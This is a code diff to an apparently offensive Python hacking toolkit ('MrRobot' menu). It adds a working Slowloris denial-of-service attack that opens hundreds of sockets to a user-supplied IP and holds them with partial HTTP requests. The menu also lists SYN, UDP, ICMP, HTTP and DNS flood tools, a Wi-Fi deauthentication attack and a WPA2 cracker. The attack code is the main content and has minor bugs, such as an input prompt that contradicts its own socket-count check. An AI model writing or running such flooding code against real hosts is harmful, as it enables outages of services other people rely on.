@@ -18,8 +18,8 @@ import pygeoip
 import tkinter as tk
 import sys
 import subprocess
-from cryptography.fernet import Fernet
 from time import sleep
+from ipaddress import ip_address
 from ntplib import *
 from queue import Queue
 from playsound import playsound
@@ -2048,7 +2048,7 @@ while True:
         if menu_help == "4":
             try:
                 # The menu 
-                print("\n" + Fore.BLUE +  "[18] DDoS Menu" + "\n" +  Fore.BLUE + "[19] Request Flood" + "\n" + Fore.BLUE + "[20] SYN Flood Attack" + "\n" + Fore.BLUE + "[21] Udp Flood" + "\n"  + Fore.BLUE + "[22] Tcp Flood" + "\n" + Fore.BLUE + "[23] Ultra Web DDoS" + "\n" + Fore.BLUE + "[24] HTTP Flood Attack" + "\n" + Fore.BLUE + "[25] ICMP Flood" + "\n" + Fore.BLUE + "[26] DNS DDoS" + "\n" + Fore.BLUE + "[27] Tcp through flooding with denied connections" + "\n")
+                print("\n" + Fore.BLUE +  "[18] DDoS Menu" + "\n" +  Fore.BLUE + "[19] Request Flood" + "\n" + Fore.BLUE + "[20] SYN Flood Attack" + "\n" + Fore.BLUE + "[21] Udp Flood" + "\n"  + Fore.BLUE + "[22] Tcp Flood" + "\n" + Fore.BLUE + "[23] Ultra Web DDoS" + "\n" + Fore.BLUE + "[24] HTTP Flood Attack" + "\n" + Fore.BLUE + "[25] ICMP Flood" + "\n" + Fore.BLUE + "[26] DNS DDoS" + "\n" + Fore.BLUE + "[27] Tcp through flooding with denied connections" + "\n" + Fore.BLUE + "[28] Slowloris"+ "\n")
                 tool3 = input(Fore.GREEN + "MrRobot~# ")
 
                 if tool3 == "23":
@@ -2141,9 +2141,9 @@ while True:
                                         """
                                                           __ _                 _ 
                                         _ __ ___  __ _   / _| | ___   ___   __| |
-                                        | '__/ _ \/ _` | | |_| |/ _ \ / _ \ / _` |
-                                        | | |  __/ (_| | |  _| | (_) | (_) | (_| |   ~>Request flooding app<~
-                                        |_|  \___|\__, | |_| |_|\___/ \___/ \__,_|  ~~>Made by tfwcodes(github)<~~
+                                       | '__/ _ \/ _` | | |_| |/ _ \ / _ \ / _` |
+                                       | | |  __/ (_| | |  _| | (_) | (_) | (_| |   ~>Request flooding app<~
+                                       |_|  \___|\__, | |_| |_|\___/ \___/ \__,_|  ~~>Made by tfwcodes(github)<~~
                                                     |_|                          
                                        """
                                         )
@@ -6651,9 +6651,113 @@ while True:
                                     
                                     for i in range(int(number_of_threads_icmp)):
                                         icmp_threads[i].join()
-                                        
                     except KeyboardInterrupt:
                         exit()
+                if tool3 == "28":
+                    try:
+                        print(
+                            """
+                            ____  _               _            _     
+                           / ___|| | _____      _| | ___  _ __(_)___ 
+                           \___ \| |/ _ \ \ /\ / / |/ _ \| '__| / __|   ~>Slowloris Attack<~
+                            ___) | | (_) \ V  V /| | (_) | |  | \__ |  ~~>Made by tfwcodes(github)<~~
+                           |____/|_|\___/ \_/\_/ |_|\___/|_|  |_|___/
+
+                            """
+                        )
+
+                        def attack(ip, sockets_number):
+                        
+                            headers = [
+                            "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
+                            "Accept-language: en-US,en,q=0.5",
+                            "Connection: Keep-Alive"
+                            ]
+
+                            socket_number = int(sockets_number)
+                            sockets = []
+
+                            print("[SOCKETS ARE BEING CREATED]")
+
+                            for i in range(socket_number):
+                                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                                s.settimeout(4)
+                                s.connect((ip, 80))
+                                sockets.append(s)
+
+                            print("[SOCKETS CREATED] - [STARTING ATTACK]")
+                            sleep(1)
+
+                            requests_num = 0
+                            requests_2_num = 0
+                            keep_alive_num = 0
+
+                            for r in sockets:
+                                r.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
+                                requests_num+=1
+                                print(f"[INFO] Send get request number {requests_num}")
+
+                                for header in headers:
+                                    r.send(bytes("{}\r\n".format(header).encode("utf-8")))
+                                print("[INFO] Header Sent")
+
+                            print("[SENDING KEEP-ALIVE HEADERS]...")
+                            sleep(1)
+
+                            while True:
+                                for v in sockets:
+                                    try:
+                                        v.send("X-a: {}\r\n".format(0, 5000).encode("utf-8"))
+                                        keep_alive_num +=1
+                                        print(f"[INFO] sent {keep_alive_num} keep-alive headers")
+                                    except socket.error:
+                                        print("[SOCKET ERROR] Attempting again")
+                                        sockets.remove(v)
+                                        try:
+                                            print("[SOCKETS ARE BEING CREATED]")
+
+                                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                                            s.settimeout(4)
+                                            s.connect((ip, 80))
+                                            sockets.append(s)
+
+                                            for r in sockets:
+                                                r.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
+                                                requests_2_num += 1
+                                                print(f"[INFO] Send get request number {requests_2_num}")
+                                                for header in headers:
+                                                    r.send(bytes("{}\r\n".format(header).encode("utf-8")))
+                                                print("[INFO] Header Sent")
+                                        except socket.error:
+                                            continue
+                        def check_ip(ip):
+                            try:
+                                ip_address(ip)
+                                print("[INFO] The ip is valid")
+                            except:
+                                print("[INFO] The ip is invalid")
+                                sleep(1)
+                                exit()
+
+                        def check_number_socket(sockets_number):
+                            if int(sockets_number) <= 200:
+                                print("[INFO] The socket number must be higher then 200")
+                                sleep(1)
+                                input()
+                                exit()
+                            else:
+                                sleep(1)
+                                attack(ip, socket_number)
+
+                        ip = input(str("[+] Target ip address: "))
+                        check_ip(ip)
+                        print("[INFO] The port will be automatically 80")
+                        socket_number = input("[+] Enter the number of sockets (<200): ")
+                        check_number_socket(socket_number)
+
+                    except KeyboardInterrupt:
+                        exit()
+                                        
             except KeyboardInterrupt:
                 exit()
 
@@ -6661,10 +6765,10 @@ while True:
         if menu_help == "5":
             try:
                 while True:
-                    print("\n" + Fore.BLUE + "[28] Deauthentication Attack" + "\n" + Fore.BLUE + "[29] WPA2 Cracker" + "\n" + "[30]" )
+                    print("\n" + Fore.BLUE + "[29] Deauthentication Attack" + "\n" + Fore.BLUE + "[30] WPA2 Cracker" + "\n")
                     print("\n" + Fore.BLUE + "[!!!] To run any tool from here you must run linux and also don't forget to run the program as sudo" + "\n")
                     acces_tool = input(Fore.GREEN + "MrRobot~# ")
-                    if acces_tool == "28":
+                    if acces_tool == "29":
                         if not 'SUDO_UID' in os.environ.keys():
                             print(Fore.BLUE + "[!] Please run the program as sudo")
                             exit()
@@ -6873,7 +6977,7 @@ while True:
                         except KeyboardInterrupt:
                             exit()
 
-                    if acces_tool == "29":
+                    if acces_tool == "30":
                         if not 'SUDO_UID' in os.environ.keys():
                             print(Fore.BLUE + "[!] Run the program as sudo")
                         print(
